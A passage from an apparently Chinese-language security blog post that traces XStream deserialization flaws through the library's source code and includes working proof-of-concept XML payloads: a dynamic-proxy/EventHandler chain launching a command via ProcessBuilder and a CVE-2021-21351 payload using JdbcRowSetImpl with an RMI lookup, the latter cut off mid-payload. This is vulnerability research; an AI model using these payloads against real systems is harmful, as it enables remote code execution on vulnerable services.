&#123;</span><br><span class="line">        <span class="built_in">this</span>.addInformationTo(var6, type, converter, parent);</span><br><span class="line">        <span class="keyword">throw</span> var6;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException var7) &#123;</span><br><span class="line">        <span class="type">ConversionException</span> <span class="variable">conversionException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(var7);</span><br><span class="line">        <span class="built_in">this</span>.addInformationTo(conversionException, type, converter, parent);</span><br><span class="line">        <span class="keyword">throw</span> conversionException;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>前面得到了converter是TreeSetConverter转换器，现在调用其unmarshal方法，进入该方法，最终会到下面这句代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);</span><br></pre></td></tr></table></figure>
+
+<p>进入该函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">populateTreeMap</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context, TreeMap result, Comparator comparator)</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">inFirstElement</span> <span class="operator">=</span> comparator == NULL_MARKER;</span><br><span class="line">    <span class="keyword">if</span> (inFirstElement) &#123;</span><br><span class="line">        comparator = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">SortedMap</span> <span class="variable">sortedMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PresortedMap</span>(comparator != <span class="literal">null</span> &amp;&amp; JVM.hasOptimizedTreeMapPutAll() ? comparator : <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (inFirstElement) &#123;</span><br><span class="line">        <span class="comment">// 将当前的内容存入Map中</span></span><br><span class="line">        <span class="built_in">this</span>.putCurrentEntryIntoMap(reader, context, result, sortedMap);</span><br><span class="line">        reader.moveUp();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.populateMap(reader, context, result, sortedMap);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入putCurrentEntryIntoMap方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">putCurrentEntryIntoMap</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context, Map map, Map target)</span> &#123;</span><br><span class="line">    <span class="comment">// 读取标签的内容并将其放入target这个Map中</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">key</span> <span class="operator">=</span> <span class="built_in">this</span>.readItem(reader, context, map);</span><br><span class="line">    target.put(key, key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一直跟进，在CachingMapper.class的realClass中会获得里面嵌套的标签&lt;String&gt;，获取到后会将该标签的值foo存入target中，继续单步获取内嵌的下一个标签<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230719193632.png"><br>进入该函数，单步执行，一直跟着标签名寻找对应的类<br>最后在com\thoughtworks\xstream\mapper\DynamicProxyMapper.class的realClass方法中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class <span class="title function_">realClass</span><span class="params">(String elementName)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> elementName.equals(<span class="built_in">this</span>.alias) ? DynamicProxy.class : <span class="built_in">super</span>.realClass(elementName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的this.alias就是dynamic-proxy，这里相等即返回DynamicProxy.class<br>F8一直返回到AbstractCollectionConverter的readItem方法，执行下一条语句，进入convertAnother方法，一直到TreeUnmarshaller的convertAnother方法，这里会得到converter为DynamicProxyConverter<br>又是同样的流程解析dynamic-proxy里面的标签内容<br>模仿上面的流程来到DynamicProxyConverter.class中的unmarshal函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> &#123;</span><br><span class="line">    <span class="type">List</span> <span class="variable">interfaces</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析dynamic-proxy里的interface和handler</span></span><br><span class="line">    Class handlerType;</span><br><span class="line">    <span class="keyword">for</span>(handlerType = <span class="literal">null</span>; reader.hasMoreChildren(); reader.moveUp()) &#123;</span><br><span class="line">        reader.moveDown();</span><br><span class="line">        <span class="type">String</span> <span class="variable">elementName</span> <span class="operator">=</span> reader.getNodeName();</span><br><span class="line">        <span class="comment">// 匹配interface</span></span><br><span class="line">        <span class="keyword">if</span> (elementName.equals(<span class="string">&quot;interface&quot;</span>)) &#123;</span><br><span class="line">            interfaces.add(<span class="built_in">this</span>.mapper.realClass(reader.getValue()));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (elementName.equals(<span class="string">&quot;handler&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 匹配handler</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">attributeName</span> <span class="operator">=</span> <span class="built_in">this</span>.mapper.aliasForSystemAttribute(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (attributeName != <span class="literal">null</span>) &#123;</span><br><span class="line">                handlerType = <span class="built_in">this</span>.mapper.realClass(reader.getAttribute(attributeName));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (handlerType == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;No InvocationHandler specified for dynamic proxy&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Class[] interfacesAsArray = <span class="keyword">new</span> <span class="title class_">Class</span>[interfaces.size()];</span><br><span class="line">        interfaces.toArray(interfacesAsArray);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (HANDLER != <span class="literal">null</span>) &#123;</span><br><span class="line">            proxy = Proxy.newProxyInstance(<span class="built_in">this</span>.classLoaderReference.getReference(), interfacesAsArray, DUMMY);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 解析handler标签下的东西，解析流程和上面一致</span></span><br><span class="line">        handler = (InvocationHandler)context.convertAnother(proxy, handlerType);</span><br><span class="line">        reader.moveUp();</span><br><span class="line">        <span class="keyword">if</span> (HANDLER != <span class="literal">null</span>) &#123;</span><br><span class="line">            Fields.write(HANDLER, proxy, handler);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            proxy = Proxy.newProxyInstance(<span class="built_in">this</span>.classLoaderReference.getReference(), interfacesAsArray, handler);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行到最后的return，结果如下：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230719200939.png"><br>然后又一直return，回到TreeMapConverter的populateTreeMap函数<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230719202237.png"><br>这里的result是TreeMap<br>接着进入TreeMap的putAll函数，然后调用父类(Abstract)的putAll，接着又来到TreeMap的put方法，此时的k是代理类，它代理的是EventHandler类<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230719210542.png"><br>执行到这里的时候会通过EventHandler的invoke方法调用compareTo方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(<span class="keyword">final</span> Object proxy, <span class="keyword">final</span> Method method, <span class="keyword">final</span> Object[] arguments)</span> &#123;</span><br><span class="line">    <span class="type">AccessControlContext</span> <span class="variable">acc</span> <span class="operator">=</span> <span class="built_in">this</span>.acc;</span><br><span class="line">    <span class="keyword">if</span> ((acc == <span class="literal">null</span>) &amp;&amp; (System.getSecurityManager() != <span class="literal">null</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;AccessControlContext is not set&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Object&gt;() &#123;</span><br><span class="line">        <span class="comment">// 会执行这里</span></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> invokeInternal(proxy, method, arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, acc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会继续执行至invokeInternal函数,直到下面这行代码<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230719205925.png"><br>这里的targetMethod方法正是java.lang.ProcessBuilder.start(),而这里的targetMethod方法是从上面的代码获取来的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (targetMethod == <span class="literal">null</span>) &#123;</span><br><span class="line">    targetMethod = Statement.getMethod(target.getClass(),</span><br><span class="line">                <span class="string">&quot;set&quot;</span> + NameGenerator.capitalize(action), argTypes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数调用栈</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">invokeInternal:<span class="number">482</span>, EventHandler (java.beans)</span><br><span class="line">access$<span class="number">000</span>:<span class="number">279</span>, EventHandler (java.beans)</span><br><span class="line">run:<span class="number">430</span>, EventHandler$<span class="number">1</span> (java.beans)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">invoke:<span class="number">428</span>, EventHandler (java.beans)</span><br><span class="line">compareTo:-<span class="number">1</span>, $Proxy0 (com.sun.proxy)</span><br><span class="line">put:<span class="number">568</span>, TreeMap (java.util)</span><br><span class="line">putAll:<span class="number">281</span>, AbstractMap (java.util)</span><br><span class="line">putAll:<span class="number">327</span>, TreeMap (java.util)</span><br><span class="line">populateTreeMap:<span class="number">122</span>, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">unmarshal:<span class="number">94</span>, TreeSetConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">convert:<span class="number">72</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:<span class="number">65</span>, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">66</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">50</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:<span class="number">134</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">32</span>, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">1157</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:<span class="number">1141</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">1012</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">1003</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:<span class="number">24</span>, CVE20137258 (Xstream)</span><br></pre></td></tr></table></figure>
+
+<p>到这里，整个过程就结束了，<strong>总结如下</strong>：</p>
+<ol>
+<li>从com.thoughtworks.xstream.core.TreeUnmarshaller的start函数开始，执行HierarchicalStreams.readClassType，通过标签名从Mapper中获取对应的class对象</li>
+<li>获得class对象后返回至start函数，来到TreeUnmarshaller的convertAnother函数，该方法将上面返回的类转换成Java对象<ul>
+<li>通过mapper.defaultImplementationOf方法查找class的实现类</li>
+<li>通过converterLookup.lookupConverterForType根据对应的类寻找正确的转换器Converter</li>
+<li>调用AbstractReferenceUnmarshaller的convert方法获得对应的对象<ul>
+<li>根据获取到的Converter，调用unmarshal方法，读取其子节点，并转化成对应的变量，直到所有节点解析完成</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p>另一个POC：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>/C<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>good<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里通过this.converterLookup.lookupConverterForType函数得到的converter是TreeMapConverter<br>而TreeMapConverter的unmarshal函数如下,相对来讲对比于TreeSetConverter转换器的unmarshal函数，少了很多判断条件，即限制</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> &#123;</span><br><span class="line">    <span class="type">TreeMap</span> <span class="variable">result</span> <span class="operator">=</span> comparatorField != <span class="literal">null</span> ? <span class="keyword">new</span> <span class="title class_">TreeMap</span>() : <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 判断是否存在comparator</span></span><br><span class="line">    <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="built_in">this</span>.unmarshalComparator(reader, context, result);</span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>) &#123;</span><br><span class="line">        result = comparator == <span class="literal">null</span> ? <span class="keyword">new</span> <span class="title class_">TreeMap</span>() : <span class="keyword">new</span> <span class="title class_">TreeMap</span>(comparator);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.populateTreeMap(reader, context, result, comparator);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其他过程与上面同理</p>
+<h1 id="CVE-2021-21351"><a href="#CVE-2021-21351" class="headerlink" title="CVE-2021-21351"></a>CVE-2021-21351</h1><p><strong>影响版本</strong>：&lt;&#x3D;1.4.15<br><strong>测试环境</strong>：XStream1.4.15 jdk1.8_66<br><strong>漏洞复现</strong>：<br>POC</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XRTreeFrag&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtm</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__size</span>&gt;</span>-10086<span class="tag">&lt;/<span class="name">m__size</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__incremental</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__incremental</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__source__location</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__source__location</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__defaultHandler</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__shouldStripWS</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__shouldStripWS</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__indexing</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__indexing</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__incrementalSAXSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fPullParserConfig</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">listeners</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fPullParserConfig</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">name</span>&gt;</span>setAutoCommit<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">class</span>&gt;</span>boolean<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fConfigParse</span> <span class="attr">reference</span>=<span class="string">&#x27;../fConfigSetInput&#x27;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fParseInProgress</span>&gt;</span>false<span class="tag">&lt;/<span class="name">fParseInProgress</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__incrementalSAXSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__walker</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">nextIsRaw</span>&gt;</span>false<span class="tag">&lt;/<span class="name">nextIsRaw</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__walker</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__endDocumentOccured</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__endDocumentOccured</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__idAttributes</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__textPendingStart</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">m__textPendingStart</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__useSourceLocationProperty</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__useSourceLocationProperty</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__pastFirstElement</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__pastFirstElement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">m__dtm</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtmIdentity</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmIdentity</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span 